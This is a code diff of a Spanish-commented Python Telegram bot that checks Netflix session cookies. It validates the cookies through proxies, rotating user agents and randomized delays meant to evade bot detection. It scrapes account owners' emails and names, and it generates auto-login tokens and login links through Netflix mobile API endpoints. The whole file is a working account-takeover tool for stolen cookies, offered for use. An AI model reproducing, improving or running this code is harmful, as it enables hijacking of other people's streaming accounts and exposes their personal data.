@@ -24,7 +24,7 @@ if not BOT_TOKEN:
     raise ValueError("Falta la variable de entorno TELEGRAM_TOKEN en Render")
 
 DEVELOPER = "@Molina"
-VERSION = "3.1.0-ANTIBOT-REAL" # Actualizada para incluir navegación simulada y delays
+VERSION = "3.1.0-ANTIBOT-REAL"
 
 # 🔒 IDs de ADMINS
 ADMIN_IDS = [8917082484]
@@ -38,9 +38,9 @@ logger = logging.getLogger(__name__)
 # 🛡️ Palabras bloqueadas (SPAM)
 SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'bonus', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
 
-# 🔄 LISTA DE USER-AGENTS ROTATIVOS (Mejora Anti-Bloqueo)
+# 🔄 LISTA DE USER-AGENTS ROTATIVOS
 USER_AGENTS = [
-    # iOS (Alta prioridad para tokens)
+    # iOS
     "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
@@ -80,12 +80,28 @@ def _country(cc):
     return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")
 
 def parse_netscape(text):
+    """Parsea cookies en formato Netscape, compatible con espacios múltiples"""
     cookies = {}
     for line in text.splitlines():
         line = line.strip()
-        if not line or line.startswith("#"): continue
-        parts = line.split("\t")
-        if len(parts) >= 7: cookies[parts[5]] = parts[6]
+        if not line or line.startswith("#"): 
+            continue
+        
+        # Dividir por cualquier whitespace (espacios, tabs, mixtos)
+        parts = line.split()
+        
+        # Formato Netscape tiene 7+ columnas:
+        # domain  flag  path  secure  expiration  name  value
+        if len(parts) >= 7:
+            name = parts[5]
+            value = parts[6]
+            cookies[name] = value
+        elif len(parts) == 2:
+            # Caso simple: name=value (para cookies sueltas)
+            name, _, value = parts[0].partition("=")
+            if name and value:
+                cookies[name] = value
+    
     return cookies
 
 def parse_json_cookies(text):
@@ -118,56 +134,17 @@ _IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false
 _IOS_HEADERS_BASE = {"x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',"x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true","x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4","x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375","x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053","x-netflix.client.type":"argo","x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',"x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0","x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3"}
 
 def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
-    """Genera nftoken usando Android API (más estable) con fallback iOS."""
+    """Mejora: Intenta obtener un token real de login con UA rotativa."""
     if not netflix_id_raw: return None
     netflix_id = urllib.parse.unquote(str(netflix_id_raw))
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
-    # 1. Intentar con API de Android (La más compatible hoy en día)
-    try:
-        sess = requests.Session()
-        sess.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
-        if proxies: 
-            sess.proxies = proxies
-            sess.verify = False
-        
-        # Usamos un UA de Android aleatorio
-        android_uas = [ua for ua in USER_AGENTS if "Android" in ua or "com.netflix" in ua]
-        android_ua = random.choice(android_uas) if android_uas else USER_AGENTS[0]
-        
-        payload = {
-            "operationName": "CreateAutoLoginToken",
-            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
-            "extensions": {
-                "persistedQueries": {
-                    "version": 102,
-                    "id": "76e97129-f4b5-41a0-a73c-12e674896849"
-                }
-            }
-        }
-        
-        headers = {
-            "User-Agent": android_ua,
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-        }
-        
-        r = sess.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, headers=headers, timeout=timeout)
-        
-        if r.status_code == 200:
-            d = r.json()
-            tok = (d.get("data") or {}).get("createAutoLoginToken")
-            if tok: 
-                return str(tok)
-    except Exception as e:
-        logger.debug(f"Fallo Android API: {e}")
+    # Método 1: API iOS (Más rápido para tokens)
+    headers = dict(_IOS_HEADERS_BASE)
+    headers["Cookie"] = f"NetflixId={netflix_id}"
+    headers["User-Agent"] = random.choice(USER_AGENTS)
 
-    # 2. Fallback a iOS (tu método original, por si acaso)
     try:
-        headers = dict(_IOS_HEADERS_BASE)
-        headers["Cookie"] = f"NetflixId={netflix_id}"
-        headers["User-Agent"] = random.choice(USER_AGENTS)
-        
         r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, proxies=proxies, timeout=timeout, verify=False)
         if r.status_code == 200:
             data = r.json()
@@ -176,6 +153,25 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
             if tok: return str(tok)
     except: pass
 
+    # Método 2: GraphQL Android (Fallback)
+    try:
+        sess2 = requests.Session()
+        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
+        if proxies: sess2.proxies, sess2.verify = proxies, False
+
+        sess2.headers.update({
+            "User-Agent": random.choice(USER_AGENTS),
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        })
+
+        payload = {"operationName":"CreateAutoLoginToken","variables":{"scope":"WEBVIEW_MOBILE_STREAMING"},"extensions":{"persistedQueries":{"version":102,"id":"76e97129-f4b5-41a0-a73c-12e674896849"}}}
+        r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, timeout=timeout)
+        if r2.status_code == 200:
+            d = r2.json()
+            tok = (d.get("data") or {}).get("createAutoLoginToken")
+            if tok: return str(tok)
+    except: pass
     return None
 
 def check_account(cookies: dict, proxy=None, timeout=20):
@@ -188,7 +184,6 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
 
     sess = requests.Session()
-    # Usamos un UA aleatorio de nuestra nueva lista
     sess.headers.update({
         "User-Agent": random.choice(USER_AGENTS),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -203,34 +198,26 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
 
     try:
-        # PASO 5: SIMULAR ENTRADA A LA PÁGINA PRINCIPAL PRIMERO
-        # Esto calienta la sesión y obtiene cookies de tracking necesarias
-        time.sleep(random.uniform(2, 4)) # Delay humano antes de entrar
+        time.sleep(random.uniform(2, 4))
         sess.get("https://www.netflix.com/", timeout=10)
 
-        # PASO 4: DELAY HUMANO ANTES DE PEDIR CUENTA
-        time.sleep(random.uniform(3, 8)) # Simula que el usuario navegó y luego hizo click
+        time.sleep(random.uniform(3, 8))
 
-        # Pedimos la página de cuenta principal
         r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
     except Exception as e:
         logger.debug(f"Navegación fallida: {e}")
         return None
 
-    # CRITERIO DE VALIDACIÓN MEJORADO
     html = r.text
 
-    # Indicadores fuertes de que la cuenta está VIVA
     is_member = '"membershipStatus":"CURRENT_MEMBER"' in html
     has_email = '"emailAddress"' in html
     has_profile = '"profileName"' in html
 
-    # Si no cumple al menos 2 de 3, probablemente sea falso positivo o cookie vieja
     if not (is_member and has_email):
         if "login" in r.url.lower() or r.status_code in (401, 403):
              return None
 
-    # Extracción robusta de datos
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
     name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
     if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))
@@ -283,14 +270,12 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     user_guid = _rx(r'"userGuid":"([^"]+)"', html)
     netflix_id_raw = cookies.get("NetflixId","")
 
-    # GENERAR TOKEN SI ES POSIBLE
     tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
 
     if tok:
         tok_safe = urllib.parse.quote(tok, safe="")
-        # URL Mejorada: usa 'login' en lugar de '/unsupported' para móviles
-        login_pc = f"https://www.netflix.com/login?nftoken={tok_safe}"
-        login_phone = f"https://www.netflix.com/login?nftoken={tok_safe}"
+        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
+        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
     else:
         login_pc, login_phone = "N/A", "N/A"
 
@@ -342,7 +327,6 @@ def load_proxies_from_file(filepath="proxies.txt"):
 class NetflixChecker:
     def __init__(self, threads=5, proxy_list=None, timeout=20):
         self.threads, self.timeout = threads, timeout
-        # Si no hay lista, intenta cargar desde el archivo del repositorio
         if not proxy_list:
             proxy_list = load_proxies_from_file("proxies.txt")
 
@@ -407,7 +391,6 @@ class NetflixCheckerBot:
     def __init__(self, token, proxy_list=None):
         self.token = token
         self.app = Application.builder().token(token).build()
-        # Pasamos la lista de proxies al checker
         self.checker = NetflixChecker(threads=5, proxy_list=proxy_list)
         self.user_sessions = {}
         self.app.add_handler(CommandHandler("start", self.start_command))
@@ -599,7 +582,6 @@ class NetflixCheckerBot:
         self.app.run_polling()
 
 if __name__ == "__main__":
-    # Cargamos los proxies desde el archivo del repositorio
     proxy_list = load_proxies_from_file("proxies.txt")
     bot = NetflixCheckerBot(BOT_TOKEN, proxy_list=proxy_list)
     bot.run()
